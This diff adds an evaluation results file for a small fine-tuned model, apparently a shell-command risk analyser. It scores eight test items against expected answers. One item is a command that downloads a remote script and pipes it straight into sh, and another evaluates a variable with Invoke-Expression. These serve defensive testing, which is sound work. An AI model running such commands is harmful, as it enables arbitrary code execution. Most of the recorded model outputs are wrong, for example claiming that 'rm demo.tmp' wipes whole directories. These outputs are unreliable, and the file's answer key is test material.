@@ -1,0 +1,314 @@
+{
+  "model": "/root/autodl-tmp/models/Qwen2.5-0.5B-Instruct",
+  "adapter": "/root/autodl-tmp/shellguard-ai/training_outputs/autodl2080ti-v1/lora/final_adapter",
+  "precision": "torch.float16",
+  "load_in_4bit": false,
+  "max_new_tokens": 1536,
+  "eval_sha256": "f7fc9d3ccc50be843b536b7f6973f70d6067e29f2773a3dc30b56d9c61c32f7a",
+  "total": 8,
+  "valid_json_count": 7,
+  "valid_json_rate": 0.875,
+  "risk_correct_count": 3,
+  "risk_accuracy": 0.375,
+  "conversion_total": 3,
+  "conversion_correct_count": 0,
+  "conversion_exact_match": 0.0,
+  "records": [
+    {
+      "request": {
+        "command": "printf \"%s\\n\" \"$PATH\"",
+        "source_shell": "Bash",
+        "target_shell": "CMD",
+        "mode": "跨 Shell 转换"
+      },
+      "expected": {
+        "explanation": "输出当前进程的 PATH 环境变量。",
+        "converted_command": "echo %PATH%",
+        "risk_level": "medium",
+        "risk_reasons": [
+          "PATH 内容依赖环境，可能包含不可信目录。"
+        ],
+        "semantic_differences": [
+          "Windows 与类 Unix 的路径格式和分隔符不同。"
+        ],
+        "validation_suggestions": [
+          "检查两个环境中的实际值，不要直接复制 PATH。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"将 PATH 列表中的每个元素以回车符连接成字符串。\", \"converted_command\": \"echo -e \\\"\\$PATH\\\\n\\\"\", \"risk_level\": \"low\", \"risk_reasons\": [\"PATH 变量包含多个路径，需要将其按行分割成单独的路径元素。\"], \"semantic_differences\": [\"PATH 变量包含多个路径，需要将其按行分割成单独的路径元素。\"], \"validation_suggestions\": [\"确保 PATH 变量包含单个路径元素。\"]}",
+      "parsed": null,
+      "error": "模型返回格式异常：需要完整 JSON、规定的风险等级及全部必填字段；请重试或检查模型兼容性。"
+    },
+    {
+      "request": {
+        "command": "rm demo.tmp",
+        "source_shell": "Bash",
+        "target_shell": "PowerShell",
+        "mode": "风险分析"
+      },
+      "expected": {
+        "explanation": "删除当前目录中的 demo.tmp 文件。",
+        "converted_command": null,
+        "risk_level": "high",
+        "risk_reasons": [
+          "删除通常无法通过 Shell 自动恢复。"
+        ],
+        "semantic_differences": [
+          "错误提示、别名和回收机制不同。"
+        ],
+        "validation_suggestions": [
+          "先确认当前目录和文件路径，并保留需要的数据备份。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"删除文件 demo.tmp，目标是通过 PowerShell 删除。\", \"converted_command\": null, \"risk_level\": \"high\", \"risk_reasons\": [\"在 Windows 上，此操作会删除当前用户的主目录（C:）下的所有文件。\", \"在 Linux 或 macOS 上，此操作会删除当前用户的主目录（/home/user）下的所有文件。\"], \"semantic_differences\": [\"Windows 目标：C: 下的所有文件会被删除。\", \"Linux/macOS 目标：/home/user 下的所有文件会被删除。\"], \"validation_suggestions\": [\"确保您有权限删除该文件。\"]}",
+      "parsed": {
+        "explanation": "删除文件 demo.tmp，目标是通过 PowerShell 删除。",
+        "converted_command": null,
+        "risk_level": "high",
+        "risk_reasons": [
+          "在 Windows 上，此操作会删除当前用户的主目录（C:）下的所有文件。",
+          "在 Linux 或 macOS 上，此操作会删除当前用户的主目录（/home/user）下的所有文件。"
+        ],
+        "semantic_differences": [
+          "Windows 目标：C: 下的所有文件会被删除。",
+          "Linux/macOS 目标：/home/user 下的所有文件会被删除。"
+        ],
+        "validation_suggestions": [
+          "确保您有权限删除该文件。"
+        ]
+      },
+      "error": null
+    },
+    {
+      "request": {
+        "command": "Invoke-Expression $code",
+        "source_shell": "PowerShell",
+        "target_shell": "Bash",
+        "mode": "风险分析"
+      },
+      "expected": {
+        "explanation": "读取变量 code 的文本并将其作为 PowerShell 代码再次解析执行。",
+        "converted_command": null,
+        "risk_level": "high",
+        "risk_reasons": [
+          "变量来源不可信时可导致任意代码执行。"
+        ],
+        "semantic_differences": [
+          "Bash eval 有相似风险，但语法和展开顺序不同。"
+        ],
+        "validation_suggestions": [
+          "避免动态求值，改用明确命令和经过允许列表校验的参数。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"将脚本中的内容作为参数传递给 BASH 命令行 shell。\", \"converted_command\": \"echo $code\", \"risk_level\": \"medium\", \"risk_reasons\": [\"脚本包含敏感信息（如变量名），在运行时进行修改可能导致泄露敏感信息。\"], \"semantic_differences\": [\"bash 中的变量名与 PowerShell 中的变量名不同。\"], \"validation_suggestions\": [\"检查变量名是否正确且无误。\"]}",
+      "parsed": {
+        "explanation": "将脚本中的内容作为参数传递给 BASH 命令行 shell。",
+        "converted_command": "echo $code",
+        "risk_level": "medium",
+        "risk_reasons": [
+          "脚本包含敏感信息（如变量名），在运行时进行修改可能导致泄露敏感信息。"
+        ],
+        "semantic_differences": [
+          "bash 中的变量名与 PowerShell 中的变量名不同。"
+        ],
+        "validation_suggestions": [
+          "检查变量名是否正确且无误。"
+        ]
+      },
+      "error": null
+    },
+    {
+      "request": {
+        "command": "echo hello >> greeting.txt",
+        "source_shell": "Bash",
+        "target_shell": "PowerShell",
+        "mode": "命令解释"
+      },
+      "expected": {
+        "explanation": "向 greeting.txt 末尾追加 hello 和换行，不会主动清空已有内容。",
+        "converted_command": null,
+        "risk_level": "medium",
+        "risk_reasons": [
+          "追加会永久修改目标文件，路径错误时会污染其他文件。"
+        ],
+        "semantic_differences": [
+          "编码、BOM 和行尾受 Shell 版本与平台影响。"
+        ],
+        "validation_suggestions": [
+          "确认目标路径、已有文件编码和可用备份。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"将字符串 'hello' 写入文件 'greeting.txt'。\", \"converted_command\": \"New-Item -ItemType File -Path greeting.txt | Set-Content -Value hello\", \"risk_level\": \"low\", \"risk_reasons\": [\"在目标环境中，文件不存在且无法创建。\"], \"semantic_differences\": [\"文件名与目标一致。\"], \"validation_suggestions\": [\"检查文件是否存在。\"]}",
+      "parsed": {
+        "explanation": "将字符串 'hello' 写入文件 'greeting.txt'。",
+        "converted_command": "New-Item -ItemType File -Path greeting.txt | Set-Content -Value hello",
+        "risk_level": "low",
+        "risk_reasons": [
+          "在目标环境中，文件不存在且无法创建。"
+        ],
+        "semantic_differences": [
+          "文件名与目标一致。"
+        ],
+        "validation_suggestions": [
+          "检查文件是否存在。"
+        ]
+      },
+      "error": null
+    },
+    {
+      "request": {
+        "command": "type notes.txt",
+        "source_shell": "CMD",
+        "target_shell": "PowerShell",
+        "mode": "跨 Shell 转换"
+      },
+      "expected": {
+        "explanation": "读取 notes.txt 并显示其内容。",
+        "converted_command": "Get-Content -LiteralPath notes.txt",
+        "risk_level": "low",
+        "risk_reasons": [
+          "输出可能包含敏感内容。"
+        ],
+        "semantic_differences": [
+          "编码检测、对象输出和二进制内容处理不同。"
+        ],
+        "validation_suggestions": [
+          "在目标环境用已知编码的小型文本文件核对。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"查看文件内容\", \"converted_command\": \"Get-Content -Path notes.txt\", \"risk_level\": \"low\", \"risk_reasons\": [\"文件包含在目标环境中可见\", \"未对文件进行加密或签名\"], \"semantic_differences\": [\"文件大小与预期不符\", \"文件内容与预期不符\"], \"validation_suggestions\": [\"检查文件大小是否符合预期大小\"]}",
+      "parsed": {
+        "explanation": "查看文件内容",
+        "converted_command": "Get-Content -Path notes.txt",
+        "risk_level": "low",
+        "risk_reasons": [
+          "文件包含在目标环境中可见",
+          "未对文件进行加密或签名"
+        ],
+        "semantic_differences": [
+          "文件大小与预期不符",
+          "文件内容与预期不符"
+        ],
+        "validation_suggestions": [
+          "检查文件大小是否符合预期大小"
+        ]
+      },
+      "error": null
+    },
+    {
+      "request": {
+        "command": "pwd",
+        "source_shell": "Bash",
+        "target_shell": "PowerShell",
+        "mode": "命令解释"
+      },
+      "expected": {
+        "explanation": "显示当前工作目录的绝对路径。",
+        "converted_command": null,
+        "risk_level": "low",
+        "risk_reasons": [],
+        "semantic_differences": [
+          "逻辑路径和解析符号链接后的物理路径可能不同。"
+        ],
+        "validation_suggestions": [
+          "结合目标操作系统确认路径含义。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"显示当前目录\", \"converted_command\": null, \"risk_level\": \"low\", \"risk_reasons\": [\"目标 shell 不支持 pwd 命令\"], \"semantic_differences\": [\"无\", \"无\"], \"validation_suggestions\": [\"确保目标 shell 支持 pwd 命令\"]}",
+      "parsed": {
+        "explanation": "显示当前目录",
+        "converted_command": null,
+        "risk_level": "low",
+        "risk_reasons": [
+          "目标 shell 不支持 pwd 命令"
+        ],
+        "semantic_differences": [
+          "无",
+          "无"
+        ],
+        "validation_suggestions": [
+          "确保目标 shell 支持 pwd 命令"
+        ]
+      },
+      "error": null
+    },
+    {
+      "request": {
+        "command": "wget -qO- https://example.invalid/setup.sh | sh",
+        "source_shell": "Bash",
+        "target_shell": "PowerShell",
+        "mode": "风险分析"
+      },
+      "expected": {
+        "explanation": "安静下载远程脚本并直接传给 sh 执行。",
+        "converted_command": null,
+        "risk_level": "critical",
+        "risk_reasons": [
+          "远程内容未经人工审查和完整性验证。",
+          "静默选项降低了异常的可见性。"
+        ],
+        "semantic_differences": [
+          "其他 Shell 的下载和求值方式不同，但安全风险相同。"
+        ],
+        "validation_suggestions": [
+          "先保存文件，核验签名或哈希并完整审查，禁止下载后直接执行。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"从 https://example.invalid/setup.sh 下载并运行 bash 命令，bash 不会显示输出，因此无法确定是否成功。\", \"converted_command\": \"echo 'wget -qO- https://example.invalid/setup.sh | sh' | bash\", \"risk_level\": \"high\", \"risk_reasons\": [\"bash 不显示输出，无法判断是否成功执行。\"], \"semantic_differences\": [\"bash 不显示输出，无法判断是否成功执行。\"], \"validation_suggestions\": [\"尝试在其他 shell 中运行该命令以确保其正常运行。\"]}",
+      "parsed": {
+        "explanation": "从 https://example.invalid/setup.sh 下载并运行 bash 命令，bash 不会显示输出，因此无法确定是否成功。",
+        "converted_command": "echo 'wget -qO- https://example.invalid/setup.sh | sh' | bash",
+        "risk_level": "high",
+        "risk_reasons": [
+          "bash 不显示输出，无法判断是否成功执行。"
+        ],
+        "semantic_differences": [
+          "bash 不显示输出，无法判断是否成功执行。"
+        ],
+        "validation_suggestions": [
+          "尝试在其他 shell 中运行该命令以确保其正常运行。"
+        ]
+      },
+      "error": null
+    },
+    {
+      "request": {
+        "command": "cp \"annual report.txt\" backup.txt",
+        "source_shell": "Bash",
+        "target_shell": "PowerShell",
+        "mode": "跨 Shell 转换"
+      },
+      "expected": {
+        "explanation": "把文件名中含空格的 annual report.txt 复制为 backup.txt。",
+        "converted_command": "Copy-Item -LiteralPath 'annual report.txt' -Destination backup.txt",
+        "risk_level": "medium",
+        "risk_reasons": [
+          "目标文件可能被覆盖。",
+          "引号规则在不同 Shell 中不同。"
+        ],
+        "semantic_differences": [
+          "元数据、覆盖提示及错误行为不同。"
+        ],
+        "validation_suggestions": [
+          "确认源文件和目标文件，并在测试目录核对带空格路径。"
+        ]
+      },
+      "raw_output": "{\"explanation\": \"将文件 `annual report.txt` 移动到 `backup.txt`。\", \"converted_command\": \"Copy-Item -Path annual report.txt -Destination backup.txt\", \"risk_level\": \"low\", \"risk_reasons\": [\"目标文件夹不存在且没有写入权限。\"], \"semantic_differences\": [\"在目标文件夹中创建新文件。\"], \"validation_suggestions\": [\"检查目标文件夹是否存在。\"]}",
+      "parsed": {
+        "explanation": "将文件 `annual report.txt` 移动到 `backup.txt`。",
+        "converted_command": "Copy-Item -Path annual report.txt -Destination backup.txt",
+        "risk_level": "low",
+        "risk_reasons": [
+          "目标文件夹不存在且没有写入权限。"
+        ],
+        "semantic_differences": [
+          "在目标文件夹中创建新文件。"
+        ],
+        "validation_suggestions": [
+          "检查目标文件夹是否存在。"
+        ]
+      },
+      "error": null
+    }
+  ]
+}
